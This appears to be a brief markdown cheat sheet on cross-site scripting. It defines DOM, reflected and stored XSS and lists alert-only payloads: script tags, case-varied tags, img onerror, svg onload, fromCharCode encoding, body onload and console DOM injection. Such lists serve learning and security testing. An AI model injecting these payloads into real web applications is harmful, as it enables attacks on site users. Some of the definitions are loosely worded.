
# XSS (DOM)

`A DOM-based cross-site scripting (XSS) attack happens when a threat actor modifies the document object model (DOM) environment in the victim's browser. So, while the HTML itself doesn't change, the code on the client side executes differently.`

# XSS (Reflected)

`reflected XSS is a kind of cross-site scripting attack, where malicious script is injected into websites that are trusted or otherwise benign. Typically, the injection occurs when an unsuspecting user clicks on a link that is specifically designed to attack the website they are visiting.`

# XSS (Stored)

`Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser.`

# XSS Examples
```javascript
<script>alert("Hello XSS")</script>
<ScRipT>alert("Hello XSS")</ScRipT>
<img src="x" onerror="alert('stored xss');">
<svg src="x" onload="alert('stored xss');">

<script>alert(String.fromCharCode(88,83,83,33))</script>
<script>eval(alert(String.fromCharCode(88,83,83,33)))</script>

```
✅ Option 1: Put it in the page HTML
Example (stored or reflected XSS):
```javascript
<body onload=alert('XSS Stored')>
<body background="javascript:alert('XSS')">
```

✅ Option 2: Inject via DOM in console
```javascript
document.body.setAttribute("onload", "alert('XSS Stored')")
document.body.innerHTML += '<img src=x onerror="alert(\'XSS Stored\')">'
```
